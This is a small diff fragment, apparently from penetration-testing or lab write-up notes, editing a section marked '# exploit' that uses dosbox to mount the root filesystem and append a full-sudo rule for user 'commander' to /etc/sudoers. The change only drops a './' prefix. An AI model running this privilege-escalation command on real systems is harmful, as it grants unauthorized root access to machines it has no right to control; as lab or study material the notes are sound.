@@ -362,7 +362,7 @@ define( 'DB_HOST', 'localhost' );
 
 # exploit
 LFILE='/etc/sudoers'
-./dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:$LFILE" -c exit
+dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:$LFILE" -c exit
 ```
 
 ### Cockpit
